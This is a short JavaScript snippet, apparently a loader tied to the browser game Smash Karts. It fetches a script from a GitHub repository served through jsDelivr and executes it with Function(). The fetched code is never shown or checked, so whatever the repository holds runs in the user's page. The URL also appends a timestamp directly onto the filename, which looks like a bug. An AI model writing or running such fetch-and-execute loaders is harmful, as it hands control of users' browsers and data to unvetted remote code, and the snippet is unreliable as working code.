const URL = "https://cdn.jsdelivr.net/gh/suppressfinallygotgh/smashkarts@main/veck.js" + Date.now();

fetch(URL)
  .then(r => r.text())
  .then(code => {
    try {
      Function(code)();
    } catch (e) {
      console.error(e);
    }
  })
  .catch(console.error);
